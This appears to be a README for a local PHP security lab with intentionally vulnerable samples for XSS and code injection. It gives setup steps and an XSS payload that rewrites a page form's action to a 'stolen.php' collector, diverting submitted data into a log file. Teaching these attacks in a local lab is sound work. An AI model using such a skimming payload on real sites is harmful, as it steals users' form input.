# php-hacking

## Setup

Install XAMP or another based on your operating system. If using MAMP for mac clone this repo inside the `/Applications/MAMP/htdocs` directory.

```
cd /Applications/MAMP/htdocs
git clone git@github.com:ar-to/php-hacking.git
```

Open the correct url for the sample. See below.

### Browser

Change the port to the one provided by your server. Below uses MAMP 8888.

- XSS form action: http://localhost:8888/php-hacking/xss-php/xss-form-action.php
- Code Injection: http://localhost:8888/php-hacking/code-injection-php/victim.php

## Instructions

### XSS via Form action

1. test the forms
2. past the javascript code into the search input ans submit:
```
<script>window.onload=function() {document.forms[0].action = "http://localhost:8888/xss-php/stolen.php"};</script>
```
3. check the log.txt file in the `xss-php` directory

### Code injection via include and url param

1. test the form
2. Follow the instructions in the page

